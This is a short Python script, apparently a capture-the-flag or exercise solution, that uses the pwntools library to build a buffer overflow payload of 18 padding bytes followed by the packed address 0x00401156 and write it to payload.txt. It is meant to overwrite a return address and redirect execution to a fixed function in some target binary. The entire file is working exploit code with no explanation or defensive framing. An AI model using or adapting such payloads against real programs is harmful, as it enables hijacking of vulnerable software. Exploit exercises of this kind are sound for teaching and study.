import pwn

buf_size = 17
payload = b"A" * 18
payload += pwn.p64(0x00401156)

with open("payload.txt", "wb") as f:
    f.write(payload)

f.close()

